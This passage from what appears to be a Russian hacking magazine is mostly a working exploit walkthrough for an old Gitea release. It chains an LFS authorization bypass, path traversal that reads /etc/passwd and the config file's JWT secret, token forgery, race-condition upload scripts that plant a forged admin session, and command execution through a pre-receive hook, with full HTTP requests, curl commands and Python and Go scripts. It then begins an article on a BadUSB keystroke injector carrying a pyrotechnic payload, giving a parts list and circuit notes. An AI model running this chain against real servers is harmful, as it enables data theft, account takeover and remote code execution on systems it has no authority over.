221:    if !authenticate(ctx, repository, rv.Authorization, true) {
222:        requireAuth(ctx)
223:    }

Обрати внимание на стро ку 221: здесь про исходит проверка прав текущего
пользователя на репозиторий, к которо му будут при вязы ваться загруженные
файлы.


/modules/lfs/server.go
480: func authenticate(ctx *context.Context, repository *models.
Repository, authorization string, requireWrite bool) bool {
...
491:    if ctx.IsSigned {
492:        accessCheck, _ := models.HasAccess(ctx.User.ID, reposi
tory, accessMode)
493:        return accessCheck
494:    }
...
504:    if !strings.HasPrefix(authorization, "Basic ") {
505:        return false
506:    }
...
508:    c, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(
authorization, "Basic "))
509:    if err != nil {
510:        return false
511:    }
...
524:    if !userModel.ValidatePassword(password) {
525:        return false
526:    }
...
528:    accessCheck, _ := models.HasAccess(userModel.ID, repository,
accessMode)
529:    return accessCheck

Если доступа у юзера нет или запрос вообще был отправлен неавторизован‐
ным анонимом, то вызывается requireAuth. Эта функция возвращает ответ
со статусом 401.


/modules/lfs/server.go
572: func requireAuth(ctx *context.Context) {
573:    ctx.Resp.Header().Set("WWW‐Authenticate", "Basic
realm=gitea‐lfs")
574:    writeStatus(ctx, 401)
575: }

Однако PostHandler после этого не прекраща ет выполнение, так как отсутс‐
твует выход из функции с помощью оператора return, как это сделано в пре‐
дыдущих провер ках на строках 201 и 206. Из‐за этого ошибка сохранения
данных о файле все же произойдет.


/modules/lfs/server.go
225:    meta, err := models.NewLFSMetaObject(&models.LFSMetaObject{
Oid: rv.Oid, Size: rv.Size, RepositoryID: repository.ID})
226:    if err != nil {
227:        writeStatus(ctx, 404)
228:        return
229:    }

Запомним этот трюк и посмотрим на структуру тела запроса, который сох‐
раняет данные о большом файле.


{
    "Oid": "aabbccddeeff01234567890123456789012345678",
    "Size": 1000000
}

С size, я думаю, все понятно — это размер файла, а вот Oid — это ID объ‐
екта (ObjectID). Это SHA‐хеш, контрольная сумма содержимого и заголовка
файла. Если ты знаешь структуру репозитория, то в курсе, что существует
папка objects, в которой и хранятся эти объекты. Подробнее о структуре
можно прочитать, например, на git‐scm.com.
  Сейчас же нас интересу ет, что данный хеш — это часть пути, который
будет формироваться при попытке доступа к нужному объ екту. В Gitea они
сохраняются в базе данных, в таб лице lfs_meta_object.


/models/lfs.go
44: func NewLFSMetaObject(m *LFSMetaObject) (*LFSMetaObject, error) {
...
63:     if _, err = sess.Insert(m); err != nil {
64:         return nil, err
65:     }
66:
67:     return m, sess.Commit()


/models/lfs.go
09: type LFSMetaObject struct {
10:     ID           int64     `xorm:"pk autoincr"`
11:     Oid          string    `xorm:"UNIQUE(s) INDEX NOT NULL"`
12:     Size         int64     `xorm:"NOT NULL"`
13:     RepositoryID int64     `xorm:"UNIQUE(s) INDEX NOT NULL"`
14:     Existing     bool      `xorm:"‐"`
15:     Created      time.Time `xorm:"‐"`
16:     CreatedUnix  int64     `xorm:"created"`
17: }

При помощи следующего зап роса мы соз дадим записи о наличии большого
файла в репозитории.


POST /vh/test.git/info/lfs/objects HTTP/1.1
Host: gitea.vh:3000
Accept: application/vnd.git‐lfs+json
Accept‐Language: en
Content‐Type: application/json
Content‐Length: 151
{
    "Oid": "aabbccddeeff01234567890123456789012345678",
    "Size": 1000000
}





   Запрос на создание записи о наличии большого файла в репозитории

В таблице lfs_meta_object появилась новая запись. Чтобы в этом убедить‐
ся, я открою файл data/gitea.db. Как ты помнишь, в качес тве БД я исполь‐
зую SQLite.





             Просмотр записей в таб лице lfs_meta_object

Обрати внимание, что ста тус ответа — 401 и первая строка — {"message":
"Unauthorized"}. Но это не помеша ло оставшейся части кода выполниться
и создать запись. Байпас в действии.





         Обход авторизации при выполнении запросов к LFS

Предыдущим запросом мы сказали системе: «Хэй, Gitea, в репозитории
test.git, принадлежащем юзеру vh, есть большой файл, за который отвечает
объект с именем aabbcc…». Теперь по адресу http://gitea.vh:3000/vh/
test/info/lfs/objects/aabbcc... у нас имеется интерфейс для работы
с файлом. Разными запросами мы можем читать, удалять и изменять файл.
В общем случае при обращении к это му объекту система будет пытаться най‐
ти его на диске и открыть.
  Посмотрим на обработчик getContentHandler.


/modules/lfs/server.go
134: func getContentHandler(ctx *context.Context) {
135:    rv := unpack(ctx)
136:
137:    meta, _ := getAuthenticatedRepoAndMeta(ctx, rv, false)
...
155:    contentStore := &ContentStore{BasePath: setting.LFS.Conten
tPath}
156:    content, err := contentStore.Get(meta, fromByte)

Корневая дирек тория LFS, в которой должны хра нить ся все большие файлы,
как мы уже знаем, указывается при начальной нас тройке системы. Она лежит
в setting.LFS.ContentPath (LFS_CONTENT_PATH  в  ini‐файле). Работа
с ContentStore описана в файле modules/lfs/content_store.go. Пос‐
мотрим на метод Get.


/modules/lfs/content_store.go
26: func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte
int64) (io.ReadCloser, error) {
27:     path := filepath.Join(s.BasePath, transformKey(meta.Oid))
28:
29:     f, err := os.Open(path)
30:     if err != nil {
31:         return nil, err
32:     }
33:     if fromByte > 0 {
34:         _, err = f.Seek(fromByte, os.SEEK_CUR)
35:     }
36:     return f, err
37: }

Его можно триггернуть при помощи GET‐запроса.


$ curl ‐I ‐s "http://gitea.vh:3000/vh/test/info/lfs/objects/aabbcc
ddeeff01234567890123456789012345678/any"

На 27‐й строке формируется путь до файла. В ней используется путь к хра‐
нилищу LFS и Oid, переданный нами в зап росе. Но сначала хеш попадает
в функцию transformKey.


/modules/lfs/content_store.go
100: func transformKey(key string) string {
101:    if len(key) < 5 {
102:        return key
103:    }
104:
105:    return filepath.Join(key[0:2], key[2:4], key[4:])
106: }

Конструкция filepath.Join(key[0:2],  key[2:4],  key[4:]) приводит
нашу строку к следующему виду:


aa/bb/ccddeeff01234567890123456789012345678

Это относительный путь файла, который нужно прочитать. Не забываем
про BasePath, в итоге полный путь выглядит так:
 • для Windows:


   <директория_запуска_gitea>/data/lfs/aa/bb/ccddeeff0123456789012345
   6789012345678

 • для Linux:


   /data/gitea/lfs/aa/bb/ccddeeff01234567890123456789012345678

Разумеется, такого файла сейчас не существу ет и наш запрос вернет
код 404.





           Попытка прочитать несуществу ющий объ ект LFS

И все бы ничего, но вот только параметр Oid никак не проверяется
при записи в базу. Значит, мож но попробовать провернуть атаку типа path tra‐
versal, выйти из кор невой директории LFS и про читать любой файл. Давай
проверим.


ЧИТАЕМ ПРОИЗВОЛЬНЫЕ ФАЙЛЫ
Я создал тестовый файл read.me в директории, из которой запускал сервер
Gitea. Для того чтобы получился верный путь, нуж но учесть конструкцию oid[
0:2]/oid[2:4]/oid[4:]. Таким обра зом, мой запрос на создание записи
будет выглядеть так:


POST /vh/test.git/info/lfs/objects HTTP/1.1
Host: gitea.vh:3000
Accept: application/vnd.git‐lfs+json
Accept‐Language: en
Content‐Type: application/json
Content‐Length: 151
{
    "Oid": "....read.me",
    "Size": 1000000
}

Корневая директория хра нилища больших файлов — <gitea_workdir>/
data/lfs/. Сначала мы выходим на директорию выше lfs (то есть в data),
а затем выше ее — в корень к файлу read.me. Вторым запросом читаем
содержимое файла.


$ curl ‐s "http://gitea.vh:3000/vh/test/info/lfs/objects/....read.me/
any"





             Чтение произвольного файла в Gitea в Windows

В Linux прочитаем каноничный /etc/passwd.


POST /vh/test.git/info/lfs/objects HTTP/1.1
Host: gitealinux.vh:3000
Accept: application/vnd.git‐lfs+json
Accept‐Language: en
Content‐Type: application/json
Content‐Length: 151
{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000
}

Переданная строка ....../../../etc/passwd превратится в путь /data/
gitea/lfs/../../../../../etc/passwd при попытке чтения.


$ curl ‐s "http://gitea.vh:3000/vh/test.git/info/lfs/objects/......
%2F..%2F..%2Fetc%2Fpasswd/any"





                  Чтение произвольного файла в Linux

Обрати внимание на использование %2f вмес то слешей (/). Без этого сервер
вернет ошибку 404, так как будет исполь зовать конс трукции ../ при обработ‐
ке запроса URI. В результате он попытается получить доступ к странице
http://gitea.vh:3000/vh/test.git/info/lfs/etc/passwd/any.
  В Windows придется использовать обратный слеш (\) и %5c, так как в этой
ОС веб‐сервер отказывался принимать %2f.
   Также учти, что репозиторий, к которому мы привязы ваем объ екты, дол жен
быть публичным, то есть доступен для просмотра любому незаре гис три‐
рованному пользователю. В про тивном случае запросы будут отсе каться
самой первой проверкой прав дос тупа.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        ПО ЦЕПОЧКЕ
      УЯЗВИМОСТЕЙ
           ПОЛУЧАЕМ ПОЛНЫЙ КОНТРОЛЬ НАД GITEA
                                  С НУЛЯ





ГЕНЕРИРУЕМ ТОКЕНЫ АВТОРИЗАЦИИ
Мы сделали читалку файлов, а зна чит, сра зу появляется мысль прочесть файл
базы данных и узнать логин и хеш пароля админис тра тора. Сделать это мож‐
но, однако в качестве базы данных не всег да используется SQLite. Точнее
сказать, она поч ти никогда не используется. ;)
  Поэтому пойдем дру гим путем. Прочитаем конфигурационный файл Gitea.
У меня он располагается в /custom/conf/app.ini.


{
    "Oid": "....custom\\conf\\app.ini",
    "Size": 1000000
}


$ curl ‐s "http://gitea.vh:3000/vh/test/info/lfs/objects/....
custom%5Cconf%5Capp.ini/any"





           Чтение файла конфигурации Gitea через уязвимость

В этом файле хранится много чувствительной информации, в том числе логин
и пароль к серверу БД, если он используется.
  Помимо этого, здесь присутс тву ет параметр LFS_JWT_SECRET, который
используется при формировании токенов дос тупа в формате JWT (JSON Web
Token). Авторизованному пользователю разрешена загрузка, редактирование
и удаление файлов в интерфейсе LFS.
  Параметр хранится в виде URLSafe Base64, в котором все символы + и /
заменяются, соответственно, на ‐ и _.
   Теперь сформируем валидный токен. Для это го воспользуемся Python
и библиоте кой PyJWT.


$ pip install pyjwt


gentoken.py
01: import jwt
02: import time
03: import base64
04: import sys
05:
06:
07: def decode_base64(data):
08:     missing_padding = len(data) % 4
09:     if missing_padding != 0:
10:         data += '='* (4 ‐ missing_padding)
11:     return base64.urlsafe_b64decode(data)
12:
13:
14: jwt_secret = decode_base64(sys.argv[1])
15: public_user_id = sys.argv[2]
16: public_repo_id = sys.argv[3]
17: nbf = int(time.time())‐(60*60*24*1000)
18: exp = int(time.time())+(60*60*24*1000)
19:
20: token = jwt.encode({'user': public_user_id, 'repo': public
_repo_id, 'op': 'upload', 'exp': exp, 'nbf': nbf}, jwt_secret, algori
thm='HS256')
21: token = token.decode()
22:
23: print(token)

Здесь public_repo_id и public_user_id — это идентификаторы пуб личного
репозитория и его владельца, а nbf и exp — это даты начала и окончания
действия токена.
   Загружать файлы мож но при помощи запросов PUT. Логика их обработки
находится в файле modules/lfs/content_store.go.


/modules/lfs/content_store.go
40: func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.
Reader) error {
41:     path := filepath.Join(s.BasePath, transformKey(meta.Oid))
42:     tmpPath := path + ".tmp"
43:
44:     dir := filepath.Dir(path)
45:     if err := os.MkdirAll(dir, 0750); err != nil {
46:         return err
47:     }
48:
49:     file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.
O_EXCL, 0640)
50:     if err != nil {
51:         return err
52:     }
53:     defer os.Remove(tmpPath)
54:
55:     hash := sha256.New()
56:     hw := io.MultiWriter(hash, file)
57:
58:     written, err := io.Copy(hw, r)
59:     if err != nil {
60:         file.Close()
61:         return err
62:     }
63:     file.Close()
64:
65:     if written != meta.Size {
66:         return errSizeMismatch
67:     }
68:
69:     shaStr := hex.EncodeToString(hash.Sum(nil))
70:     if shaStr != meta.Oid {
71:         return errHashMismatch
72:     }
73:
74:     return os.Rename(tmpPath, path)
75: }

Главные шаги этого алгоритма примерно следующие:
 • формирование пути к временному файлу. Используется путь до дирек‐
   тории LFS (LFS_CONTENT_PATH), переданный параметр Oid и суффикс .
  tmp;
 • создание требуемых директорий, если они не сущес твуют;
 • запись переданных в запросе данных во временный файл;
 • если размер записанных данных отличает ся от переданного параметра
  Size, тогда возвращается ошибка;
 • если хеш записанных данных (SHA‐256) отличает ся от той строки, что мы
   передали в Oid, то возвращается ошиб ка;
 • переименование временного файла. Убирается суффикс .tmp.

Здесь перед нами возника ет сра зу нес колько проб лем, которые мешают экс‐
плуатации. Первая заключа ется в том, что пятый шаг описанного алгоритма
будет всегда возвращать ошибку. Это связано с тем, что мы хотим записы‐
вать информацию в про извольный файл, для этого параметр Oid будет
содержать какие угодно данные, но только не валидный хеш от той информа‐
ции, что мы хотим передать. Функция всегда будет возвращать ошибку,
и переименования фай ла в нормальный вид не слу чится.
  Другими словами, мы сможем писать только в файл с суффиксом .tmp.
Но даже такую запись выполнить не получится, потому что вторую проблему
создает строчка под номером 53 — defer os.Remove(tmpPath). В языке Go
инструкция defer помещает вызов в список отло женных. Он выполняется
после того, как функция, к которой он относится, завершит свое выполнение.
В официальном туре по Go есть небольшой при мер того, как это работает.
Получается, что при любых рас кладах временный файл будет удален незави‐
симо от результатов.
   Итого нам нужно придумать, где можно исполь зовать файл, название
которого оканчивается на .tmp, и как сох ранить его до момента исполь‐
зования.


ВЫИГРЫВАЕМ ГОНКИ
Начнем с проблемы сохранения временного файла. Gitea почти везде
использует потоко вый метод — будь то чтение/запись файлов или передан‐
ных запросов. Этот факт можно использовать в сво их целях. Если мы вос‐
пользуемся потоковой отправкой зап роса HTTP и, передав какое‐то количес‐
тво данных, приостановим ее, то функция io.Copy будет ждать оставшихся
байтов. В этот момент файл будет находиться на диске, чем мы и восполь‐
зуемся.
  Дополним скрипт функцией записи данных в файл. Для отправки запросов
будем использовать библиотеку requests.


racefile.py
01: import requests
02: import jwt
03: import time
04: import base64
05: import logging
06: import sys
07: import json
08: import socket
09: from urllib.parse import quote
10:
11:
12: logging.basicConfig(stream=sys.stdout, level=logging.INFO)
13:
14: BASE_URL = sys.argv[1]
15: JWT_SECRET = sys.argv[2]
16: USER_ID = int(sys.argv[3])
17: REPO_ID = int(sys.argv[4])
18: DATA = b'test_data_for_write_to_file'
19:
20: def generate_token():
21:     def decode_base64(data):
22:         missing_padding = len(data) % 4
23:         if missing_padding != 0:
24:             data += '='* (4 ‐ missing_padding)
25:         return base64.urlsafe_b64decode(data)
26:
27:     nbf = int(time.time())‐(60*60*24*1000)
28:     exp = int(time.time())+(60*60*24*1000)
29:
30:     token = jwt.encode(
31:         {
32:             'user': USER_ID,
33:             'repo': REPO_ID,
34:             'op': 'upload',
35:             'exp': exp,
36:             'nbf': nbf
37:         },
38:         decode_base64(JWT_SECRET),
39:         algorithm='HS256'
40:     )
41:     return token.decode()
42:
43: def gen_data():
44:     yield DATA
45:     time.sleep(60)
46:     yield b''
47:
48:
49: OID = f'....{sys.argv[5]}'
50: response = requests.post(f'{BASE_URL}.git/info/lfs/objects',
headers={
51:     'Accept': 'application/vnd.git‐lfs+json'
52: }, json={
53:     "Oid": OID,
54:     "Size": 100000
55: })
56: logging.info(response.text)
57:
58: response = requests.put(f"{BASE_URL}.git/info/lfs/objects/{quote(
OID, safe='')}", data=gen_data(), headers={
59:     'Accept': 'application/vnd.git‐lfs',
60:     'Content‐Type': 'application/vnd.git‐lfs',
61:     'Authorization': f'Bearer {generate_token()}'
62: })
63: logging.info(response.text)

Попробуем записать этим способом некоторые данные в файл.


$ python racefile.py "http://gitea.vh:3000/vh/test" "n2kBhrjIcInbbha
06nwbNYlH85AWSiJC9ZDLxAajJ‐U" 1 1 test.file





                      Race Condition в Gitea

Благодаря  находящемуся  внутри  функции  gen_data  слипу,   у  нас
есть 60 секунд, чтобы вос пользовать ся временным файлом. Естественно,
время можно увеличивать.
   Таким образом, мы провели ата ку типа Race Condition.


СТАНОВИМСЯ АДМИНОМ
Теперь нужно куда‐нибудь применить успешную ата ку. Первое, что при ходит
на ум, — это записать файл в директорию /etc/cron.d/ и получить RCE.
Только вот по дефолту про цесс gitea работа ет от юзе ра git, и прав записи
в эту папку нет.
  Обратим внимание на сес сии. За работу с ними отвечает сторонний
модуль go‐macaron/session. По умолчанию сессии хранятся в виде файлов
в директории data/sessions  (/data/gitea/sessions/ в Linux). Функция
Read выполняет чтение файлов из этой директории.


/go-macron/session/file.go
122: func (p *FileProvider) Read(sid string) (_ RawStore, err error)
{
123:    filename := p.filepath(sid)
124:    if err = os.MkdirAll(path.Dir(filename), 0700); err != nil {
125:        return nil, err
126:    }


/go-macron/session/file.go
117: func (p *FileProvider) filepath(sid string) string {
118:    return path.Join(p.rootPath, string(sid[0]), string(sid[1]),
sid)
119: }

Сорцы говорят нам о том, что переданное значение sid используется
для формирования пути до файла сес сии. Сессионная кука имеет по умол‐
чанию   имя   i_like_gitea.   Допустим,  мы   передаем   значение
7654107d001a1fc3. Тогда файл будет находиться по адресу data/sessions/
7/6/7654107d001a1fc3.





                      Чтение файла сес сии Gitea

Содержимое файла — это сериализованные данные в формате Gob.


080: func (s *FileStore) Release() error {
...
084:    data, err := EncodeGob(s.data)
085:    if err != nil {
086:        return err
087:    }
088:
089:    return ioutil.WriteFile(s.p.filepath(s.sid), data, 0600)
090: }


/session-master/utils.go
18: import (
...
21:     "encoding/gob"
...
38: func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
39:     for _, v := range obj {
40:         gob.Register(v)
41:     }
42:     buf := bytes.NewBuffer(nil)
43:     err := gob.NewEncoder(buf).Encode(obj)
44:     return buf.Bytes(), err
45: }

Объект, который нужно сериализовать, имеет следующий вид:


{
    "_old_uid": "1",
    "uid": <id_пользователя>,
    "uname": "<имя_пользователя>"
}

Чтобы сформировать данные в нужном нам формате, используем вот такой
скрипт на Go.


gensession.go
01: package main
02:
03: import (
04:     "fmt"
05:     "encoding/gob"
06:     "bytes"
07:     "encoding/hex"
08: )
09:
10: func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
11:     for _, v := range obj {
12:         gob.Register(v)
13:     }
14:     buf := bytes.NewBuffer(nil)
15:     err := gob.NewEncoder(buf).Encode(obj)
16:     return buf.Bytes(), err
17: }
18:
19: func main() {
20:     var uid int64 = 1
21:     obj := map[interface{}]interface{} {"_old_uid": "1", "uid":
uid, "uname": "vh" }
22:     data, err := EncodeGob(obj)
23:     if err != nil {
24:         fmt.Println(err)
25:     }
26:     edata := hex.EncodeToString(data)
27:     fmt.Println(edata)
28: }

Разумеется, в качестве имени и ID пользователя нам надо указать данные
администратора. Этот скрипт воз вращает стро ку в HEX‐формате, который
следует записать в файл сес сии.





            Генерация содержимого файла сессии для Gitea

Теперь добавим данные для записи в наш скрипт на Python и обновим его,
чтобы сессионный файл создавался в нужном мес те.


sessionfile.py
01: import requests
02: import jwt
03: import time
04: import base64
05: import logging
06: import sys
07: import json
08: import socket
09: from urllib.parse import quote
10:
11:
12: logging.basicConfig(stream=sys.stdout, level=logging.INFO)
13:
14: BASE_URL = sys.argv[1]
15: JWT_SECRET = sys.argv[2]
16: USER_ID = int(sys.argv[3])
17: REPO_ID = int(sys.argv[4])
18: SESSION_NAME = sys.argv[5]
19: SESSION_DATA = bytes.fromhex('0eff81040102ff820001100110000058ff
82000306737472696e670c05000375696405696e74363404020002067374726
96e670c070005756e616d6506737472696e670c040002766806737472696e67
0c0a00085f6f6c645f75696406737472696e670c03000131')
20:
21:
22: def generate_token():
23:     def decode_base64(data):
24:         missing_padding = len(data) % 4
25:         if missing_padding != 0:
26:             data += '=' * (4 ‐ missing_padding)
27:         return base64.urlsafe_b64decode(data)
28:
29:     nbf = int(time.time()) ‐ (60 * 60 * 24 * 1000)
30:     exp = int(time.time()) + (60 * 60 * 24 * 1000)
31:
32:     token = jwt.encode(
33:         {
34:             'user': USER_ID,
35:             'repo': REPO_ID,
36:             'op': 'upload',
37:             'exp': exp,
38:             'nbf': nbf
39:         },
40:         decode_base64(JWT_SECRET),
41:         algorithm='HS256'
42:     )
43:     return token.decode()
44:
45:
46: def gen_data():
47:     yield SESSION_DATA
48:     time.sleep(180)
49:     yield b''
50:
51:
52: OID = f'....data\\sessions\\{SESSION_NAME[0]}\\{SESSION_NAME[1]}\
\{SESSION_NAME}'
53: response = requests.post(f'{BASE_URL}.git/info/lfs/objects',
headers={
54:     'Accept': 'application/vnd.git‐lfs+json'
55: }, json={
56:     "Oid": OID,
57:     "Size": 100000
58: })
59: logging.info(response.text)
60:
61: response = requests.put(f"{BASE_URL}.git/info/lfs/objects/{quote(
OID, safe='')}", data=gen_data(), headers={
62:     'Accept': 'application/vnd.git‐lfs',
63:     'Content‐Type': 'application/vnd.git‐lfs',
64:     'Authorization': f'Bearer {generate_token()}'
65: })
66: logging.info(response.text)
67:


$ python racefile.py "http://gitea.vh:3000/vh/test" "n2kBhrjIcInbbha
06nwbNYlH85AWSiJC9ZDLxAajJ‐U" 1 1 fakesession

После выполнения это го скрипта будет создан файл сессии fakesession.
tmp. Указываем его в куках, обновляем страницу, и вуаля: «Добро пожаловать,
администратор».





                    Становимся админом в Gitea


ПОСЛЕДНЕЕ ЗВЕНО ЦЕПОЧКИ. ВЫПОЛНЯЕМ КОМАНДЫ
В СИСТЕМЕ
Что ж, доступ администратора у нас имеется, и с его при вилегиями уже мож‐
но натворить всяких дел. Но нас в первую очередь интересу ет возможность
удаленного выполнения команд.
  На самом деле это простейший шаг, так как Gitea поддерживает хуки Git.
О них я не так давно писал в статье «Смертельный коммит. Выполняем про‐
извольный код в клиенте git». Если в двух словах, то это обычные shell‐скрип‐
ты, которые срабатывают при определен ных условиях. В контексте RCE нас
интересует хук pre‐receive, который выполняется на сервере перед ком‐
митом в репозиторий.





               Добавляем команду в хук pre‐receive

После внесения изменений иконка напротив этого хука загорится зеленым,
и он станет активным. Я добавил команду соз дания пустого файла owned
в директории /tmp. Все, что нуж но сделать, — закоммитить какие‐нибудь
изменения в этот репозиторий, и указанный код будет выполнен.





           Удален ное выполнение про извольного кода в Gitea


ВЫВОДЫ
Так как проект активно раз вивается, разработчики уже успе ли выпустить
новые  билды  дистрибутива,  где  все  эти  проб лемы были  устранены.
На момент написания статьи последняя версия имеет порядковый номер 1.5,
можешь смело обновляться.
   Уязвимости этих классов — довольно частые гос ти новостных лент. Теперь
у тебя в арсенале имеются способы экс плуатации, так что, если вдруг нат‐
кнешься на нечто подоб ное, будешь во всеоружии. Удачных поисков!
ТРЮКИ





                                                    MG


ГОСПОДИН
САМОУНИЧТОЖЕНИЕ
КАК В ДОМАШНИХ УСЛОВИЯХ СМАСТЕРИТЬ RUB‐
BER DUCKY СО ВСТРОЕННОЙ ПИРОТЕХНИКОЙ




Представь: ты втыкаешь в USB какую‐то флеш ку, и вдруг
в браузере открывается окно, где грустный клоун крутит руч‐
ку шарманки. Когда мелодия кончается, флешка делает
«бам» и… в лучшем случае обсыпает тебя конфетти. Из этой
статьи ты узнаешь, как скрестить девайс для атак BadUSB
с  устройством  само уничтожения  и  заодно  научишься
кое‐каким мейкерским приемам.


             INFO

                      Это перевод статьи Mr. Self Destruct. A USB key‐
                           stroke injector with software‐triggered 5v payloads
                       исследователя MG. Перевел Андрей Письменный.





Если говорить об этом устройстве как о флешке, которая может испускать
дым, то, конечно, полез ных применений у нее будет немного — раз ве что
использовать в качестве декора ций в кино про хакеров для особо драматич‐
ной сцены (да и видео с PoC выходит отличным!). Однако есть масса спо‐
собов усовершенствовать полезную нагрузку. Например, можно заменить ее
на «звуковую гранату», которая подарит немного веселья команде безопас‐
ности и сдержит их импульс немедленно выдернуть посторонний предмет
из компьютера. После подключения инъ ектор нажатий на клавиши отработает
как тебе нужно, а потом завоет сирена и не будет выключаться до тех пор,
пока батарейка не умрет. Это возможно потому, что софт контролирует
переключатель, способ ный подавать столько питания, сколько дает порт
USB.
  В общем, тут можно использовать много вари антов небольших схемок.
А если ты можешь поставить корпус побольше, например взять формат смен‐
ных дисков на 2,5 дюйма, то выбор ста новится еще богаче. Это отлично
сочетается с устрой ствами, которые работают от батарейки. Например,
боевые девайсы для работы с Wi‐Fi (взлом, глушилки и прочее), которые
будут получать питание от батарейки, только ког да их принесут в целевую
зону.


             INFO

                      Это описание про екта с основными данными
                      об электронной схе ме. Подробная информация
                      о каких‐либо опасных манипуляциях умышленно
                      не сообщается. Видео с демонстрацией нельзя
                       воспроизвести без дополнительной работы, поз‐
                      наний и компонен тов. Кое‐какую вспомогатель‐
                     ную информацию можно найти в моем твиттере.



МОТИВАЦИЯ
Этот небольшой проект начался с того, что я нат кнулся в твиттере на нелепую
картинку: на ней была изоб ражена петарда, спря танная внутри флешки.
У всех, кто видел эту картинку, была примерно одна реакция: весело, конечно,
но зло. Я стал раздумывать о воз можнос ти совместить что‐то подобное
с Rubber Ducky, чтобы иметь и прог раммный пейлоад, и физичес кий.
  Не буду останавливаться на неудачных экспериментах, которы ми  я
занимался, пока искал раз ные подходы и делал улучшения. Большая часть
этих твиков требовала умений, которыми я не вла дею. Но какое же веселье,
если не спотыкаешься на каждом шагу? Я раньше никогда не протипировал
печатных плат, не писал прошивок, не работал ни с Android, ни с чипами AVR.


             INFO

                   В этом проекте нет ничего особенно нового: я
                      просто  объединил  разные  наработ ки  других
                      людей. Мне помогали и вдохновляли: @evan‐
                          booth,    @notdan,     @Viss,    @gsuberland
                      и @deviantollam.


Изначально я планировал использовать Hak5 Rubber Ducky, который сто‐
ит 50 долларов. Единственный выходной интерфейс у него — это LED
на 3,3 В. Я подыскал миниатюрный MOSFET, который выдерживал 3 А и более
при минимальном напряжении переключения около 1 В. Идеально: я мог под‐
клю читься к питанию светодиода и переключать что угодно, для чего хватит
мощности USB.
  Нужно было только найти способ управлять светодиодом, потому что
Duckyscript делать этого не поз воляет. Одна ко даже с кастомной прошивкой я
смогу получить только очень ограниченный контроль над све тодиодом. Потом
я обнаружил проекты типа «USB Rubber Ducky за доллар» (или 3–5 долларов),
в которых использовался чип ATtiny85. Это куда более удачный под ход.
В качестве бонуса в боль шинстве схем заодно получа ешь два незаня тых пор‐
та GPIO!
  В поисках наименее затратного способа получить такое устройство,
который бы не растянулся на месяцы в ожи дании товара из Китая, я понял,
что Digispark за 5 дол ларов — это практически готовые платы, и они продают‐
ся на Amazon. Там же обнаружилось нес колько клонов Digispark по 3 дол лара
за штуку и по 1,5 дол лара — на eBay. Причем у них есть не только нужный мне
ATtiny85, но и большинство других компонентов, необ ходимых для проекта.


СПИСОК ДЕТАЛЕЙ
Вот как в итоге выглядит список деталей.


Основные детали
 • Здравый смысл — 1 шт. Старайся оберегать себя и дру гих от раз‐
   нообразных опасностей;
 • ATtiny85 — 1 шт. (с кло на Digispark);
 • сопротивление на 68 Ом — 2 шт. (с кло на Digispark);
 • сопротивление на 1,5 кОм — 1 шт. (с клона Digispark);
 • стабилитрон на 3,6 В — 2 шт. (с кло на Digispark);
 • МОП‐транзистор (MOSFET) IRLML2502 — 1 шт. (тут есть разные варианты.
  Например, ZXMN2F34FHTA тоже будет неплохо работать);
 • сопротивление примерно на 680 Ом (см. важное примечание о безопас‐
   ности в инструкции по сборке).


Опциональные детали и инстру мен ты
 • Старая флеш ка в выдвижном исполнении. Нам пригодится ее корпус
   и штекер USB;
 • печатная плата для прототипирования SMTpad 50x50 (это то, что исполь‐
   зовал я, наверняка более опытные товари щи найдут более удачный спо‐
   соб собрать схему);
 • медная лента (я использовал ее для замыкания соединений на плате);
 • припой, паяльная пас та, канифоль;
 • паяльник или паяльная станция.


Де тали для пейлоада
 • Тут все полностью зависит от того, что ты собира ешься добавлять. Пей‐
   лоад будет получать напряжение в 5 В на ту продолжительность времени,
   которую ты настроишь (по крайней мере, пока устройство подключено,
   если нужно — добавляй батарейку).
 • Для чего‐то типа «звуковой гра наты» можно нап рямую подключать кон‐
   некторы 5 В.
 • Для чего‐то драматичного вро де дымовых шашек… эту информацию я,
   пожалуй, опущу, чтобы кто‐нибудь из читателей не наделал глупостей.
  Прости, но мне придется еще в паре мест проделать с текстом такую под‐
   лянку.


СОБИРАЕМ ВСЕ ВМЕСТЕ
Если хочешь сделать большое устрой ство, например в формате внешнего
диска на 2,5", тогда можешь просто взять Digispark и добавить MOSFET
для управления нашим физическим пей лоадом. А вот если ты захочешь
затол кать все в крошечный формат USB‐флешки, то придется ужать все ком‐
поненты. Первым делом на составные час ти придется разобрать Digispark.
Это мне вышло дешевле и ока залось удобнее, чем покупать все компоненты
по отдельности. Так что дальше будет подразумеваться, что ты пойдешь
по тому же пути.


Схе ма
В целом тут ничего принципиально нового. Схему я успешно позаимс твовал
из проектов по клонированию Rubber Ducky на ATtiny85.





В моем варианте к пятому пину прос то присоединен МОП‐транзистор.
Наименьший и наиболее чистый пример в таком варианте — это uDuck. Схе‐
ма максимально простая и поддерживает самый минимум функций USB. Ста‐
билитроны снижают напряжение на линиях переда чи данных до 3,6 В. Соп‐
ротивления помогают устройству соответство вать спецификациям USB (ско‐
рость распознавания, мощность и так далее) — важно для совместимости. Я
видел схемы, в которых часть (или даже все) сопротивления и стабилитроны
убирают, отче го совместимость и надежность силь но падают.
  Еще несколько вещей, о которых стоит знать.
 • Сопротивление между исто ком и стоком МОП‐транзистора тре бует изу‐
   чения. Когда сопротивление слишком высоко или резистора вообще нет,
   полезная нагрузка будет сра батывать при загрузке. Дело в том, что ATtiny
   подает на контакты напряжение при включении. Спасибо Грэму Сазер‐
   ленду (@gsuberland) за помощь в этом вопросе.
 • Можно сделать двойной триггер, продублировав схе му с МОП‐транзисто‐
  ром на шестом пине.


ДИЗАЙН ПЛАТЫ
Учитывая нестандартный расклад печатной платы, я не знаю, как это изоб‐
разить правильно. Крас ный — это полос ки медной ленты. Обрати внимание
на места, где она загибается за углы. Зеленый — это места, где будут при‐
паяны концы проводов, иду щих к USB. Синий — контакты для проводов
к физическому пейлоаду. Почему медная лен та? Потому что я не знаю, что
делаю, а это сработало после того, как я раз десять потерпел неудачу с дру‐
гими вариантами.





Вот одна из плат обмотана лентой перед пайкой. Отверстия не используют‐
